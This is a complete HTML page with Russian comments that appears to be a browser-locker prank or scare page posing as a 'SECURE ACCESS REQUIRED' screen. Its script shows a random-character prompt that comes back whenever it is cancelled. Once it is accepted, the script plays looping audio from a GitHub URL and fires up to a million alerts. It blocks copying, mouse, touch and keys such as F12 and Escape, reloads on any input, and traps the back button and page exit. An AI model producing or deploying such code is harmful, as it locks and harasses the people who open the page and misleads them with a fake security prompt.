<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
<title>Secure</title>
<style>
  html, body {
    margin:0; padding:0; height:100%;
    background:#000; color:#000;
    overflow:hidden; user-select:none;
    -webkit-user-select:none; -ms-user-select:none;
    touch-action:none; font-family: monospace;
  }
</style>
</head>
<body>
<audio id="audio" crossorigin="anonymous" loop></audio>
<script>
(() => {
  const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
  const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
  const PROMPT_LEN = 10000;
  const ALERT_LEN = 5000;

  function randomText(len){
    let s = '';
    for(let i=0;i<len;i++){
      s += CHARS.charAt(Math.floor(Math.random()*CHARS.length));
    }
    return s;
  }

  function blockEvent(e){
    try{
      e.preventDefault();
      e.stopImmediatePropagation();
    }catch{}
    return false;
  }

  ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev=>{
    document.addEventListener(ev, blockEvent, {capture:true, passive:false});
  });

  document.addEventListener('keydown', e => {
    if(e.ctrlKey || e.metaKey || e.altKey || ['F12','F11','F10','Escape'].includes(e.key)){
      blockEvent(e);
    }
  }, {capture:true});

  const audio = document.getElementById('audio');
  audio.src = AUDIO_URL;
  audio.volume = 1.0;

  async function tryPlayAudio() {
    try {
      await audio.play();
    } catch {}
  }

  function alertSpam(count){
    if(count <= 0) return;
    alert(randomText(ALERT_LEN));
    setTimeout(() => alertSpam(count-1), 1);
  }

  function promptAndSpam(){
    const promptText = randomText(PROMPT_LEN);
    let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + promptText + "\n\nPress OK to continue");
    if(res !== null){
      tryPlayAudio();
      alertSpam(1000000);
    } else {
      // если отмена — снова prompt
      setTimeout(promptAndSpam, 0);
    }
  }

  window.onload = () => {
    promptAndSpam();
  };

  // Перезагружаем страницу при любом действии, чтобы сработать по 100%
  const reloadEvents = ['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'];
  reloadEvents.forEach(ev=>{
    window.addEventListener(ev, e => {
      try {
        location.reload();
      } catch {
        location.href = location.href;
      }
    }, {capture:true, passive:false});
  });

  // Запрет выхода со страницы
  history.pushState(null, document.title, location.href);
  window.addEventListener('popstate', ()=>history.pushState(null, document.title, location.href));

  window.onbeforeunload = e => {
    e.preventDefault();
    e.returnValue = '';
    return '';
  };
})();
</script>
</body>
</html>
